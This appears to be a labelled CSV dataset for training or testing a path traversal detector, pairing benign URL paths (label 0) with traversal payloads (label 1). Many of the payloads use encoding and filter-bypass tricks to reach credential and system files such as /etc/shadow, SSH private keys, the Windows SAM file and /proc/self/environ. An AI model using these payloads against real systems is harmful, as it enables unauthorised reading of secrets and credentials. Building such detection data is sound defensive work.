payload,label
/render?path=../../windows/system32/drivers/etc/hosts,1
/sitemap.xml,0
/view?page=../../etc/hosts,1
/orders/12345/track,0
/api/v1/users/42?action=delete&id=7124,0
/image?w=800&h=600&fit=cover,0
/oidc/token,0
/v2/users/me,0
/content?id=../../../etc/passwd,1
/content?path=../../windows/system32/drivers/etc/hosts,1
/index.php?include=....//....//etc/passwd,1
/static/docs/user-guide.pdf,0
../../proc/version,1
/api/v1/users,0
/register,0
/render?template=../../../etc/issue,1
..%2f..%2f..%2fetc%2fpasswd,1
/content?f=../../etc/resolv.conf,1
../../boot.ini,1
/api/v2/products/search?q=laptop?action=list&id=7788,0
/api/file?path=/etc/group,1
/assets/js/jquery-3.6.0.min.js,0
/api/v1/messages/thread/89?action=update&id=2168,0
/..%2f..%2fetc/passwd,1
/news,0
/orders/12345/track?action=list&id=888,0
..\..\..\windows\win.ini,1
/resource?key=config_v2&env=production,0
/export?file=../../etc/fstab,1
/users?role=admin&active=true,0
/assets/vendor/bootstrap.min.css,0
/data?input=..%252f..%252fetc%252fpasswd,1
..\..\/etc/passwd,1
/image?src=../../etc/shadow,1
/assets/js/jquery-3.6.0.min.js?action=delete&id=345,0
..%252f..%252fetc%252fpasswd,1
/auth/github,0
%2e%2e/%2e%2e/etc/passwd,1
/download?token=eyJhbGciOiJIUzI1NiJ9&file=report?action=list&id=1613,0
../../windows/repair/SAM,1
../../../etc/passwd,1
/public/img/banner.jpg,0
/login,0
/static/images/logo.png?action=view&id=5948,0
C:\windows\win.ini,1
%252e%252e%252fetc%252fpasswd,1
/callback/oauth,0
/content?resource=../../home/user/.ssh/id_rsa,1
../../etc/issue,1
/assets/vendor/bootstrap.min.css?action=create&id=5560,0
../../etc/resolv.conf,1
/static/fonts/roboto.woff2,0
..\..\boot.ini,1
/profile,0
/api/v1/comments/42,0
/open?path=/etc/group,1
/module?name=auth&action=verify,0
/fetch?load=/api/v1/file%3Fpath%3D../../etc/passwd,1
/uploads/user_42/avatar.png?action=update&id=3771,0
../../home/user/.ssh/id_rsa,1
..%c0%af..%c0%afetc%c0%afpasswd,1
/app.php?lang=../../etc/passwd%00,1
..%2f..%2fetc%2fpasswd,1
/static/css/main.css,0
/admin/reports,0
/500,0
../../etc/group,1
/api/v3/analytics/dashboard,0
/api/v1/auth/refresh?action=create&id=54,0
/products?action=edit&id=1546,0
../../etc/hostname,1
/resource?key=config_v2&env=production?action=update&id=4372,0
../../etc/passwd%00.php,1
/show?template=..%252f..%252fetc%252fshadow,1
/get?file=....//....//....//etc/passwd,1
/blog/post-123,0
/docs/api,0
/blog/tag/security,0
/docs?action=edit&id=8318,0
/etc/hosts,1
..././..././..././etc/passwd,1
/products/category/electronics,0
/api/file?resource=../../etc/crontab,1
/download.php?filename=../../etc/passwd,1
/saml/acs,0
../../var/log/auth.log,1
/api/v1/file?path=../../etc/passwd,1
/auth/google/callback?action=list&id=5574,0
/content?load=..%5C..%5Cboot.ini,1
../../etc/shadow,1
/panel/reports,0
/cart,0
/load.php?include=..%25255c..%25255cwindows%25255cwin.ini,1
/var/log/apache2/access.log,1
/blog/category/technology?action=update&id=7669,0
/404,0
/blog,0
/fetch?name=../../var/www/html/config.php,1
/privacy,0
/view.php?file=../../../etc/shadow,1
../../root/.ssh/authorized_keys,1
/admin/settings?action=view&id=772,0
/favicon.ico,0
/api/v1/users/42,0
..../..../etc/passwd,1
/privacy?action=create&id=6736,0
/sso/login,0
/api/v1/profile,0
/,0
../../etc/fstab,1
/read.php?path=/etc/passwd,1
../../etc/passwd%00.jpg,1
/downloads/report_2024_q3.pdf,0
/about,0
/faq,0
/api/v1/orders/12345,0
/view?id=1001&format=json?action=view&id=6305,0
/api?p=..%c0%af..%c0%afetc%c0%afpasswd,1
/data?source=analytics&period=monthly,0
....//....//etc/passwd,1
/api/v1/categories,0
/?file=..%2f..%2f..%2fetc%2fpasswd,1
/proc/self/environ,1
/etc/passwd,1
%2e./%2e./etc/passwd,1
/api/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
/admin/users,0
/fetch?url=../../../../../../etc/passwd,1
/docs,0
../../windows/win.ini,1
../../etc/hosts,1
/static/docs/user-guide.pdf?action=list&id=7063,0
/portal/login?action=list&id=4316,0
....//....//....//etc/passwd,1
/show?include=....%5C%5C....%5C%5Cwindows%5C%5Cwin.ini,1
/static/js/app.js?action=list&id=1877,0
/settings,0
..%2fetc%2fpasswd,1
/api/v1/notifications,0
/stream?channel=main&format=hls,0
/admin/download?file=../../../etc/shadow,1
/report?path=../../var/log/auth.log,1
/app/dashboard?action=delete&id=6538,0
/home,0
/api/v2/products/search?q=laptop,0
/module?name=auth&action=verify?action=update&id=9978,0
/api/v1/messages/thread/89?action=update&id=3296,0
/render?q=/download%3Fname%3D../../windows/win.ini,1
/content?template=%252e./%252e./etc/passwd,1
/portal/login,0
/portal/login?action=update&id=9441,0
/download?name=../../windows/win.ini,1
/api/v1/auth/refresh,0
/api/v2/payments/checkout,0
/download?token=eyJhbGciOiJIUzI1NiJ9&file=report,0
/uploads/user_42/avatar.png?action=edit&id=118,0
/etc/shadow,1
/config?file=../../etc/resolv.conf,1
/index.php?page=../../etc/passwd,1
../../proc/self/environ,1
/load.php?template=../../../../etc/hosts,1
/dashboard?action=edit&id=950,0
/get?resource=../../var/log/apache2/access.log,1
/api/status,0
../../../../../etc/passwd,1
/api/v1/messages/thread/89,0
../../proc/self/cmdline,1
/view?name=../../root/.bash_history,1
/404?action=update&id=6933,0
/api/file?doc=../../etc/motd,1
